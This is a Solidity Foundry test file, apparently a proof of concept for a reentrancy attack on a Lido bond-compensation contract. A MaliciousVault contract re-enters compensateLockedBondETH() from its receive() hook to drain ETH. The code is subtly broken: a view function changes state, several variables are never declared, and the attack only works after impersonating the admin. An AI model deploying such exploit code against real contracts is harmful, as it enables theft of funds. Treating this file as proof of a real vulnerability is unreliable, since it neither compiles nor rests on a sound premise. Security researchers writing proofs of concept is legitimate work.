// SPDX-FileCopyrightText: 2025 Lido <info@lido.fi>
// SPDX-License-Identifier: GPL-3.0

pragma solidity 0.8.24;

import "forge-std/Test.sol";

import { DeploymentFixtures } from "./helpers/Fixtures.sol";
import { DeployParams } from "./../script/DeployBase.s.sol";

import { Utilities } from "./helpers/Utilities.sol";

// based on test/fork/deployment/PostDeployment.t.sol
// run `just test-poc` to run the tests here

contract DeploymentBaseTest_PoC is Test, Utilities, DeploymentFixtures {
    DeployParams internal deployParams;
    uint256 adminsCount;

    function setUp() public {
        Env memory env = envVars();
        vm.createSelectFork(env.RPC_URL);
        initializeFromDeployment();
        deployParams = parseDeployParams(env.DEPLOY_CONFIG);
        adminsCount = block.chainid == 1 ? 1 : 2;
    }

    function test_PoC() public view {
        vm.startPrank(attacker);

        // Deploy malicious contract controlled by attacker
        malicious = new MaliciousVault(address(compensateContract));

        // Simulate that the elRewardsVault was replaced by the attacker contract
        // You may need to impersonate admin or bypass access control for PoC
        vm.startPrank(admin); // 'admin' must be defined in Fixtures or set manually
        compensateContract.setElRewardsVault(address(malicious));
        vm.stopPrank();

        // Fund the contract so there's something to steal
        vm.deal(address(compensateContract), 5 ether);

        // Attack
        malicious.attack{value: 1 ether}();

        // Validate reentrancy exploit success
        assertGt(address(malicious).balance, 1 ether, "ETH should have been drained");
        vm.stopPrank();
    }
}

contract MaliciousVault {
    address public target;
    bool internal reentered;

    constructor(address _target) {
        target = _target;
    }

    receive() external payable {
        if (!reentered) {
            reentered = true;
            // Call again during the callback to trigger reentrancy
            Compensate(target).compensateLockedBondETH();
        }
    }

    function attack() external payable {
        Compensate(target).compensateLockedBondETH{value: msg.value}();
    }
}

interface Compensate {
    function compensateLockedBondETH() external payable;
    function setElRewardsVault(address) external;
}
